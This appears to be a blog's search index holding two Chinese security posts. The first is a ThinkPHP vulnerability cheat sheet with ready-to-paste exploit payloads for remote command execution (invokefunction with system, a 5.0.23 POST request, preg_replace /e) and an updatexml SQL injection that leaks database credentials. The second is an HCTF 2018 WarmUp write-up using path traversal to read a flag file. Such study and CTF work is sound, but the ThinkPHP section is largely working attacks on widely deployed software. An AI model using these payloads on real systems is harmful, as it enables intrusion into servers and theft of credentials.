<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>ThinkPHP版本漏洞</title>
    <link href="/2023/04/24/ThinkPHP%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E/"/>
    <url>/2023/04/24/ThinkPHP%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="ThinkPHP版本漏洞"><a href="#ThinkPHP版本漏洞" class="headerlink" title="ThinkPHP版本漏洞"></a>ThinkPHP版本漏洞</h1><h2 id="5-x远程命令执行"><a href="#5-x远程命令执行" class="headerlink" title="5.x远程命令执行"></a>5.x远程命令执行</h2><p>影响版本：5.x </p><p>漏洞原理：控制器过滤不严，结合直接返回类名的代码操作，导致可以用命名空间的方式来调用任意类的任意方</p><p>法，控制器过滤不严导致在网站没有开启强制路由的情况下（即默认情况下）可以执行任意方法，从而导致远程命</p><p>令执行漏洞。 </p><p> payload:  </p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://地址/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars</span>[<span class="hljs-string">0</span>]=system&amp;vars[1][]=whoami（系统命令）<br><br><span class="hljs-link">http://地址/?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars</span>[<span class="hljs-string">0</span>]=phpinfo&amp;vars[1][]=1（查看phpinfo）<br></code></pre></td></tr></table></figure><h2 id="5-0-23远程代码执行"><a href="#5-0-23远程代码执行" class="headerlink" title="5.0.23远程代码执行"></a>5.0.23远程代码执行</h2><p>影响版本：&lt;&#x3D;  5.0.23 </p><p>漏洞原理：获取method的方法中没有正确处理方法名，导致攻击者可以调用Request类任意方法并构造利用链，</p><p>从而导致远程代码执行漏洞。 </p><p> payload：  发送数据包：直接粘贴即可，不用修改 </p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">POST /<span class="hljs-keyword">index</span>.php?s=captcha HTTP/<span class="hljs-number">1.1</span><br>Host: localhost<br>Accept-Encoding: gzip, deflate<br>Accept: /<br>Accept-Language: en<br>User-Agent: Mozilla/<span class="hljs-number">5.0</span> (compatible<span class="hljs-punctuation">;</span> MSIE <span class="hljs-number">9.0</span><span class="hljs-punctuation">;</span> Windows NT <span class="hljs-number">6.1</span><span class="hljs-punctuation">;</span> Win64<span class="hljs-punctuation">;</span> x64<span class="hljs-punctuation">;</span> Trident/<span class="hljs-number">5.0</span>)<br>Connection: close<br>Content-<span class="hljs-keyword">Type</span>: application/x-www-form-urlencoded<br>Content-Length: <span class="hljs-number">72</span><br>_method=__construct&amp;filter[]=system&amp;<span class="hljs-keyword">method</span>=<span class="hljs-title function_">get</span>&amp;<span class="hljs-title function_">server</span>[<span class="hljs-title function_">REQUEST_METHOD</span>]=<span class="hljs-title function_">whoami</span><br></code></pre></td></tr></table></figure><h2 id="2-x远程代码执行"><a href="#2-x远程代码执行" class="headerlink" title="2.x远程代码执行"></a>2.x远程代码执行</h2><p>影响版本：2.x，3.0版本因为Lite模式下没有修复该漏洞，也存在这个漏洞。  </p><h3 id="漏洞原理："><a href="#漏洞原理：" class="headerlink" title="漏洞原理："></a>漏洞原理：</h3><p>ThinkPHP 2.x版本中，使用preg_replace的&#x2F;e模式匹配路由： </p><p> php res &#x3D; preg_replace(‘@(\w+)’.depr.’([^’.depr.’\&#x2F;]+)@e’, ‘var[&#39;\1&#39;]&#x3D;”\2”;’, implode(depr,paths)); </p><p> 导致用户的输入参数被插入双引号中执行，造成任意代码执行漏洞。 </p><p> payload：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>地址<span class="hljs-regexp">/index.php?s=/i</span>ndex<span class="hljs-regexp">/index/</span>name/$%<span class="hljs-number">7</span>B@phpinfo()%<span class="hljs-number">7</span>D <br></code></pre></td></tr></table></figure><h2 id="Thinkphp5-SQL注入-敏感信息泄露"><a href="#Thinkphp5-SQL注入-敏感信息泄露" class="headerlink" title="Thinkphp5   SQL注入+敏感信息泄露"></a>Thinkphp5   SQL注入+敏感信息泄露</h2><p>影响版本：ThinkPHP &lt; 5.1.23 </p><p>漏洞原理：传入的某参数在绑定编译指令的时候又没有安全处理，预编译的时候导致SQL异常报错。然而</p><p>thinkphp5默认开启debug模式，在漏洞环境下构造错误的SQL语法会泄漏数据库账户和密码。 </p><p>payload：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://your-ip/index.php?ids</span>[<span class="hljs-string">0,updatexml(0,concat(0xa,user()),0)</span>]=1<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HCTF2018-WarmUp-1</title>
    <link href="/2023/04/24/HCTF2018-WarmUp-1/"/>
    <url>/2023/04/24/HCTF2018-WarmUp-1/</url>
    
    <content type="html"><![CDATA[<h1 id="HCTF-2018WarmUp-1"><a href="#HCTF-2018WarmUp-1" class="headerlink" title="HCTF 2018WarmUp-1"></a>HCTF 2018WarmUp-1</h1><p>打开靶场，看到一个滑稽表情</p><img src="/2023/04/24/HCTF2018-WarmUp-1/1682314816823.png" alt="1682314816823" style="zoom:80%;"><p>F12查看，发现存在source.php文件</p><img src="/2023/04/24/HCTF2018-WarmUp-1/1682314829956.png" alt="1682314829956" style="zoom:80%;"><p>找到源代码，对这段php进行分析</p><img src="/2023/04/24/HCTF2018-WarmUp-1/1682314881013.png" alt="1682314881013" style="zoom:80%;"><p>首先分析最后一段的三个条件</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>这三个条件都为true才能进入include函数，文件包含处flag文件，前两个条件为判断是否为空和字符串，主要看第三个<br>    <span class="hljs-keyword">if</span> (! empty(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])<span class="hljs-regexp">//</span>判断是否为空<br>        &amp;&amp; is_string(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])<span class="hljs-regexp">//</span>判断是否为字符串<br>        &amp;&amp; emmm::checkFile(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])   <span class="hljs-regexp">//</span>验证checkFile的条件是否成立<br>    ) &#123;<br>        include <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>        <span class="hljs-keyword">exit</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        echo <span class="hljs-string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;<br>    &#125;  <br>?&gt;<br></code></pre></td></tr></table></figure><p>对checkFile函数进行分析</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>定义白名单，键source的值source.php，键hint的值hint.php<br><span class="hljs-variable">$whitelist</span> = [<span class="hljs-string">&quot;source&quot;</span>=&gt;<span class="hljs-string">&quot;source.php&quot;</span>,<span class="hljs-string">&quot;hint&quot;</span>=&gt;<span class="hljs-string">&quot;hint.php&quot;</span>];<br></code></pre></td></tr></table></figure><p>对第一个条件进行分析</p><pre><code class="hljs">//判断传入的page也就是最后面三个条件中的变量file是否设置或者是否为字符串if (! isset($page) || !is_string($page)) &#123;            echo &quot;you can&#39;t see it&quot;;            return false;&#125;</code></pre><p>对第二个条件进行分析</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nsis">//判断<span class="hljs-keyword">file</span>的值是否在白名单中，如果在才会返回<span class="hljs-literal">true</span><br>if (in_array(<span class="hljs-variable">$page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><span class="hljs-comment">;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>第三段是创建一个page变量，对这个值进行截取开头到mb_strpos($page . ‘?’, ‘?’)结束的位置</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-variable">$_page</span> = mb_substr(<br>                <span class="hljs-variable">$page</span>,<br>                <span class="hljs-number">0</span>,<br>                <span class="hljs-regexp">//</span>最后的值为page中第一个?之前的内容<br>                mb_strpos(<span class="hljs-variable">$page</span> . <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>)<br>);<br></code></pre></td></tr></table></figure><p>判断$是否在白名单中</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">if</span> (in_array(<span class="hljs-variable">$_page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>                <span class="hljs-attribute">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br></code></pre></td></tr></table></figure><p>对page进行URL解码后将值重新赋值给page，然后再次截取，截取后再次赋值给page</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs autoit">$_page = urldecode($page)<span class="hljs-comment">;</span><br>            $_page = mb_substr(<br>                $_page,<br>                <span class="hljs-number">0</span>,<br>                mb_strpos($_page . <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>)<br>            )<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>判断此时的page是否在白名单中</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">if</span> (in_array(<span class="hljs-variable">$_page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>                <span class="hljs-attribute">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br></code></pre></td></tr></table></figure><p>如果没有进入if语句就会  “you can’t see it” 然后返回flase </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;you can&#x27;t see it&quot;</span>;<br>            <span class="hljs-built_in">return</span> <span class="hljs-literal">false</span>;<br><br></code></pre></td></tr></table></figure><p>经过代码审计，可以看出需要让checkFile为真的前提下来构造payload用于包含 ffffllllaaaagggg  文件。第二个if判断了文件名，则file只能为source.php或者hint.php</p><p>查看hint.php文件，通过暗示构造payload</p><img src="/2023/04/24/HCTF2018-WarmUp-1/1682314805774.png" alt="1682314805774" style="zoom:80%;"><p>flag被写了四次，可以尝试跨越四层目录去找这个文件</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gradle">payload：<span class="hljs-keyword">source</span>.php?<span class="hljs-keyword">file</span>=hint.php?..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>ffffllllaaaagggg<br><br></code></pre></td></tr></table></figure><p>成功找到flag</p><img src="/2023/04/24/HCTF2018-WarmUp-1/1682314769365.png" alt="1682314769365" style="zoom:80%;">]]></content>
    
    
    
    <tags>
      
      <tag>CTF-WEB</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
